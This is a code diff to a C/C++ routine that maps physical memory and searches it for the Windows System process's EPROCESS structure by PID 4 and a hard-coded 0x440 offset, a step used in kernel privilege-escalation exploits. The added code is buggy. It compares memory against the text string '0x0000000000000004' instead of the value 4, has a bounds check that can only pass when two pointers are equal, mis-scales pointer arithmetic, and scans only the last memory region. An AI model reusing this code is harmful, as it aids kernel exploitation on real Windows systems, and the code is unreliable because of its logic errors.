@@ -130,7 +130,7 @@ int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength,
 		exit(EXIT_FAILURE);
 	}
 	// go through mapped physical memory regions
-	for (int i = 0; i < memRegionsCount; i++) {
+	for (int i = memRegionsCount-1; i < memRegionsCount; i++) {
 		unsigned __int64 start = memRegion[i].address;
 		unsigned __int64 end = memRegion[i].address + memRegion[i].size;
 		printf("%p - %p\n", (void*)start, (void*)end);
@@ -143,9 +143,11 @@ int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength,
 				return -1;
 			}
 			PVOID castedBuf = *buf;
-
+			int offset2 = 0;
 			// go through page byte by byte and search for pattern
 			for (unsigned int offset = 0; offset < (0xfff - patternLength); offset++) {
+
+				offset2++;
 				castedBuf = (unsigned char*)castedBuf + 1;
 				if (memcmp(castedBuf, pattern, patternLength) == 0)
 				{
@@ -162,6 +164,38 @@ int searchPhysicalMemory(unsigned char* pattern, unsigned __int64 patternLength,
 							printf("\nFound pattern at: %p\n", (void*)(page + offset));
 						}
 					}
+					else
+					{
+						fprintf(stderr, "Struct does not fit into one page. Trying mapping 4 pages.\n");
+						PVOID* fourPages = (PVOID*)malloc(0x4000);
+						if (fourPages == 0) {
+							exit(EXIT_FAILURE);
+						}
+						if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, page - 0x2000, 0x4000, fourPages) == FALSE) {
+							fprintf(stderr, "[!] MapPhysicalMemory failed");
+							return -1;
+						}
+						patternLocation = page + offset;
+						// get middle of fourPages
+						fourPages = fourPages + 0x2000;
+						EPROCESSBaseOfSystem = (unsigned char*)fourPages - 0x5A7 + offset;
+						UniqueProcessId = EPROCESSBaseOfSystem + 0x440;
+						if ((unsigned __int64)fourPages <= (unsigned __int64)UniqueProcessId && (unsigned __int64)UniqueProcessId <= (unsigned __int64)fourPages)
+						{
+							printf("Struct does fit into four pages.\n");
+							if (memcmp(UniqueProcessId, "0x0000000000000004", 8) == 0)
+							{
+								// PID of System is 4
+								locations.push_back(patternLocation);
+								printf("\nFound pattern at: %p\n", (void*)(page + offset));
+							}
+						}
+						else
+						{
+							fprintf(stderr, "Struct does not fit into four page.\n");
+						}
+					}
+
 				}
 			}
 			if (UnmapPhysicalMemory(buf) == FALSE) {
